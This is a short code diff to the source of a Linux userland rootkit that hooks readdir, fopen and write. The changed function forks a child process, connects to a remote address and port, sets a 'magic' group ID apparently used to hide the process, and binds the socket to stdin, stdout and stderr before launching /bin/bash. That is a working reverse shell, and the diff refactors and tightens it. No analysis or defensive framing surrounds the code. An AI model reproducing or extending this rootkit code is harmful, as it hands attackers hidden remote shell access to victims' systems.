@@ -13,6 +13,7 @@
 #include <netinet/in.h>
 #include "rootkit.h"
 
+
 static struct dirent* (*old_readdir)(DIR *dir) = NULL;
 static struct dirent64* (*old_readdir64)(DIR *dir) = NULL;
 static FILE* (*old_fopen)(const char *pathname, const char *mode) = NULL;
@@ -21,29 +22,30 @@ static ssize_t (*old_write)(int fd, const void *buf, size_t count) = NULL;
 
 
 void IPv4() {
-    pid_t pid;
     int sockfd;
+    pid_t pid = fork();
 
-    if(pid = fork() == 0) {
-        if((sockfd = socket(AF_INET, SOCK_STREAM, 0)) != -1) {
-            struct sockaddr_in server, client;
+    if(pid < 0) return;
+    if(pid == 0) {
+        if((sockfd = socket(AF_INET, SOCK_STREAM, 0)) == -1) exit(0x0);
+        struct sockaddr_in server, client;
 
-            inet_pton(AF_INET, REMOTE_ADDR_4, &server.sin_addr);
-            server.sin_port = htons(REMOTE_PORT);
-            server.sin_family = AF_INET;
+        inet_pton(AF_INET, REMOTE_ADDR_4, &server.sin_addr);
+        server.sin_port = htons(REMOTE_PORT);
+        server.sin_family = AF_INET;
 
-            client.sin_addr.s_addr = INADDR_ANY;
-            client.sin_port = htons(LOCAL_PORT);
-            client.sin_family = AF_INET;
+        client.sin_addr.s_addr = INADDR_ANY;
+        client.sin_port = htons(LOCAL_PORT);
+        client.sin_family = AF_INET;
 
-            if ((bind(sockfd, (struct sockaddr *)&client, sizeof(client)) != -1) &&
-            (connect(sockfd, (struct sockaddr *)&server, sizeof(server)) != -1)) {
-                for(int i = 0; i < 3; i++) dup2(sockfd, i);
-                execve("/bin/bash", NULL, NULL);
-                close(sockfd);
-                exit(0x0);
-            }
-        }
+        if (bind(sockfd, (struct sockaddr *)&client, sizeof(client)) == -1) exit(0x0);
+        if (connect(sockfd, (struct sockaddr *)&server, sizeof(server)) == -1) exit(0x0);
+
+        setgid(MAGIC_GID);
+        for(int i = 0; i < 3; i++) dup2(sockfd, i);
+        execve("/bin/bash", NULL, NULL);
+        close(sockfd);
+        exit(0x0);
     }
 }
 
